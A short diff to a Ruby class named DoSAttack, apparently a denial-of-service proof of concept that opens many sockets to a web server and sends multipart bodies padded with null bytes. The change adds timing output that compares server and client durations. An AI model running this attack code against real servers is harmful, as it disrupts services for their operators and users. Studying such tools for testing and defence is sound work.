@@ -45,6 +45,7 @@ class DoSAttack
   end
 
   def request
+    now = Time.now
     sock = TCPSocket.new(@host, 80)
     @socks[sock.object_id] = sock
     sock.write(@header)
@@ -56,7 +57,8 @@ class DoSAttack
     sock.write("\0" * (@size % 8192))
     sock.write("#{NEWLINE}--b--")
     res = sock.readpartial(4096)
-    puts res[/\r\n\r\n(.*)/, 1]
+    printf "Server: %9f  Client: %9f\n",
+           res[/\r\n\r\n(.*)/, 1].to_f, (Time.now - now).to_f
     @socks.delete(sock.object_id)
     if @socks.empty?
       terminate
